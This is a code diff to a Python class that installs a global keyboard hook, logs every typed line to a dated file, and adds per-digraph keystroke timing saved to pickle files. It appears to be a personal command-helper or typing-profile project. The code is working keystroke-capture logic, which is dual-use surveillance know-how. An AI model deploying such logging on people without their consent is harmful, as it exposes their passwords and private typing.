@@ -1,15 +1,23 @@
 import pyHook, pythoncom, sys, logging,os, pyperclip, httplib, urllib, getpass, shutil, pickle
 from datetime import datetime
+from time import time
 import threading
 from random import randint
 
 class Varys:
 
     def __init__(self):
+        self.data_collector=True
         self.__file_log = datetime.now().strftime('%y%m%w%d')+".txt"
-        x=open("datadict.p","rb")
+        x=open("..//Citidel//datadict.p","rb")
         self.__grph = pickle.load(x)
         x.close()
+
+        x=open("..//Citidel//key_timer.p","rb")
+        self.__key_strokes = pickle.load(x)
+        x.close()
+
+        self.__press1=time()
         self.__take_cmd=0
         self.__cmd=''
         self.__line_buff=""
@@ -40,6 +48,7 @@ class Varys:
             self.__line_buff+="\n"
             logging.log(10,self.__line_buff)
             self.__line_buff=""
+            pickle.dump(self.__key_strokes,open("..//Citidel//key_timer.p","wb"))
 
 
     #### Check if user needs file/folder opened
@@ -95,7 +104,10 @@ class Varys:
 
         if(ky > 31 and ky < 127):
             self.__line_buff += chr(ky)
-##        TODO might have bug in taking first cmd
+            press_time=time()-self.__press1
+            if(press_time<0.25):
+                self.__key_strokes[self.__line_buff[-2:]]=self.__key_strokes.get(self.__line_buff[-2:],0.2)-(self.__key_strokes.get(self.__line_buff[-2:],0.2)-press_time)/20
+            self.__press1=time()
             if(self.__take_cmd):
                 self.__cmd+=chr(ky)
                 if(chr(ky)=='<'):
